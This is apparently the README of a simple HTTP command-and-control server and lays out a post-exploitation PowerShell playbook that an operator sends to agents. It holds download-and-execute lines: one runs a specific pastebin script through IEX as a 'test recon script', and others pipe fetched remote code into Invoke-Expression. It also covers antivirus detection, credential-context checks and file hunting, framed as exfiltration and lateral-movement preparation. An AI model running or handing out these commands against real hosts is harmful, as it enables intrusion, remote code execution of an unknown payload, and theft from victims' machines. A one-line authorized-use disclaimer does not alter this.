# SimpleC2Listener

Basic HTTP C2 server for remote command execution. Install this agent on your Command and Control Windows Host. Right click and 'Run As Administrator'

## Features
- HTTP-based beacon check-ins
- PowerShell command execution
- Agent session tracking
- Console interface

## Usage
1. Build and run: `dotnet run`
2. Connect agents to `http://your-ip:8080`
3. Use console commands: `cmd <agent> <command>`


Run a test recon script

cmd agent_001 IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/7iAQJzH1')

# PowerShell Command Examples

This section demonstrates various PowerShell commands that can be executed through the SimpleC2Listener framework. These commands showcase typical post-exploitation reconnaissance and system enumeration techniques used in cybersecurity assessments.

## Basic System Information

### User Context
```powershell
C2> cmd agent_001 whoami
C2> cmd agent_001 whoami /priv
C2> cmd agent_001 $env:USERNAME
```

### System Information
```powershell
C2> cmd agent_001 systeminfo
C2> cmd agent_001 Get-WmiObject -Class Win32_ComputerSystem
C2> cmd agent_001 Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory
```

### Operating System Details
```powershell
C2> cmd agent_001 Get-WmiObject -Class Win32_OperatingSystem
C2> cmd agent_001 hostname
```

## User and Group Enumeration

### Local Users
```powershell
C2> cmd agent_001 Get-LocalUser | Where-Object {$_.Enabled -eq $true}
C2> cmd agent_001 Get-LocalGroupMember -Group "Administrators"
```

### Current User Privileges
```powershell
C2> cmd agent_001 whoami /priv
C2> cmd agent_001 whoami /groups
```

## Process and Service Enumeration

### Running Processes
```powershell
C2> cmd agent_001 Get-Process | Select-Object -First 10
C2> cmd agent_001 Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
C2> cmd agent_001 Get-Process | Where-Object {$_.ProcessName -eq "explorer"}
```

### Services
```powershell
C2> cmd agent_001 Get-Service | Where-Object {$_.Status -eq "Running"}
C2> cmd agent_001 Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.State -eq "Running"}
```

### Security Software Detection
```powershell
C2> cmd agent_001 Get-Process | Where-Object {$_.ProcessName -match "defender|kaspersky|symantec|mcafee|norton"}
C2> cmd agent_001 Get-Service | Where-Object {$_.Name -match "defender|antivirus|firewall"}
```

## Network Reconnaissance

### Network Configuration
```powershell
C2> cmd agent_001 ipconfig /all
C2> cmd agent_001 Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"}
C2> cmd agent_001 Get-NetNeighbor | Where-Object {$_.State -eq "Reachable"}
```

### Network Connections
```powershell
C2> cmd agent_001 netstat -an | findstr LISTENING
C2> cmd agent_001 netstat -an | findstr ESTABLISHED
```

## File System Enumeration

### Directory Listings
```powershell
C2> cmd agent_001 dir C:\
C2> cmd agent_001 Get-ChildItem -Path C:\ -Force -ErrorAction SilentlyContinue
C2> cmd agent_001 dir C:\Users
C2> cmd agent_001 Get-ChildItem -Path "C:\Program Files" | Select-Object Name
```

### User Directories
```powershell
C2> cmd agent_001 dir C:\Users\%USERNAME%\Desktop
C2> cmd agent_001 dir C:\Users\%USERNAME%\Documents
C2> cmd agent_001 dir C:\Users\%USERNAME%\Downloads
```

### File Search
```powershell
C2> cmd agent_001 Get-ChildItem C:\ -Recurse -Include *.txt,*.doc,*.pdf -ErrorAction SilentlyContinue | Select-Object FullName -First 20
C2> cmd agent_001 dir C:\Users -Recurse -Include *.exe | Select-Object Name, Directory, Length
```

### Large Files
```powershell
C2> cmd agent_001 Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 100MB} | Select-Object FullName, Length
```

## System Event Logs

### Security Events
```powershell
C2> cmd agent_001 Get-EventLog -LogName Security -Newest 5 | Select-Object TimeGenerated,EventID,Message
C2> cmd agent_001 Get-EventLog -LogName System -Newest 10 | Select-Object TimeGenerated,Source,Message
```

## Remote Script Execution

### Execute Remote PowerShell Scripts
```powershell
C2> cmd agent_001 IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/YOUR_SCRIPT_ID')
```

### Download and Execute from URL
```powershell
C2> cmd agent_001 Invoke-WebRequest -Uri "https://example.com/script.ps1" -UseBasicParsing | Invoke-Expression
```

## Advanced System Information

### Hardware Information
```powershell
C2> cmd agent_001 Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores
C2> cmd agent_001 Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object Capacity -Sum
```

### Installed Software
```powershell
C2> cmd agent_001 Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Sort-Object Name
C2> cmd agent_001 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

### Startup Programs
```powershell
C2> cmd agent_001 Get-WmiObject -Class Win32_StartupCommand | Select-Object Name, Command, Location
```

## Environment and Registry

### Environment Variables
```powershell
C2> cmd agent_001 Get-ChildItem Env: | Sort-Object Name
C2> cmd agent_001 $env:PATH
C2> cmd agent_001 $env:COMPUTERNAME
```

### Registry Queries
```powershell
C2> cmd agent_001 Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
```

## Administrative Commands

### Scheduled Tasks
```powershell
C2> cmd agent_001 Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath
```

### Windows Features
```powershell
C2> cmd agent_001 Get-WindowsFeature | Where-Object {$_.InstallState -eq "Installed"}
```

## Usage Notes

- Replace `agent_001` with your actual agent ID
- Some commands may require elevated privileges
- Add `-ErrorAction SilentlyContinue` to suppress error messages
- Use `Select-Object -First N` to limit output for large datasets
- Commands can be chained with PowerShell operators like `|`, `Where-Object`, etc.

## Security Testing Scenarios

These commands are commonly used in:
- **Post-exploitation reconnaissance**
- **Privilege escalation enumeration**
- **Lateral movement preparation**
- **Data discovery and exfiltration planning**
- **Security control identification**

**Important:** Only use these commands in authorized testing environments or systems you own.


